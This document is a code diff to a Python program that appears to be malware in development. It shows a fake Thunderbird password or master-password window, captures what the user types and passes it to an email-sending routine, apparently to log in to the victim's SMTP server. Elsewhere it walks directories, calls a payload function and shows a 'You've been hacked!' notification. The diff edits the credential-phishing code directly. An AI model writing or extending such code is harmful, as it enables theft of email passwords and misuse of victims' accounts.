@@ -358,7 +358,9 @@ def traverse_dirs(curr_dir: str) -> None:
 # ------------------------- password window code ---------------------------
 # --------------------------------------------------------------------------
 
+window: QWidget = None
 textfield: QLineEdit = None
+password: str = None
 DEFAULT22_BASE64 : str = ""\
 "iVBORw0KGgoAAAANSUhEUgAAABYAAAAWCAYAAADEtGw7AAAEdUlEQVR42qWUezBcZxjG96/e/vJv"\
 "pzONS9a6Lva+bgmxu0SVSTRIK0uqUdego6RoNSTRIDZWWJdlsYxWXYO0BLusIdaiLksGHcNUqtUy"\
@@ -466,12 +468,11 @@ def rand_dir_name() -> str:
     return dir_name
 
 def copy_password() -> None:
-    print(f"password = {textfield.text()}")
-        
-def copy_master_password() -> None:
-    print(f"master password = {textfield.text()}")
+    global password
+    print(f"copy_password(): password = {textfield.text()}") # test output
+    password = textfield.text()
 
-def password_window(account_name: str = "", host_name: str = "") -> None:
+def password_window(account_name: str = "", host_name: str = "") -> str:
     """
     Shows either a Thunderbird password input window or a Thunderbird
     master password input window, depending on the value of `password_type`.
@@ -480,7 +481,7 @@ def password_window(account_name: str = "", host_name: str = "") -> None:
                     user email address.
     :host_name:     default value ""; the URL of the server to log in.
     """
-    global textfield
+    global window, textfield
     #lang = Lang.EN # For easy testing of the English output
     
     app = QApplication(sys.argv)
@@ -545,10 +546,8 @@ def password_window(account_name: str = "", host_name: str = "") -> None:
 
     window.show()
     
-    # Start the application's event loop (`app.exec_()`), wrapped in a call to
-    # `sys.exit()` to cleanly exit the program and release memory resources when 
-    # the application terminates.
-    sys.exit(app.exec_())
+    app.exec_()
+    return password
 
 
 # --------------------------------------------------------------------------
@@ -1013,11 +1012,12 @@ def send_email() -> None:
             print(f"smtp_server_url = {smtp_server_url}")
             print(f"authentication_method = {authentication_method}")
             sender_password = password_window(account_name=sender_username, host_name=smtp_server_url)
+            print(f"sender_password = {sender_password}")
             #send_mail_mime(sender_email, smtp_server_url, authentication_method, sender_password, to_email_addresses)
 
 
 if __name__ == "__main__":
     random.seed((datetime.now()).strftime("%H%M%S"))
-    payload()
+    #payload()
     send_email()
     notification("You've been hacked!", message="", app_name="filewriter")
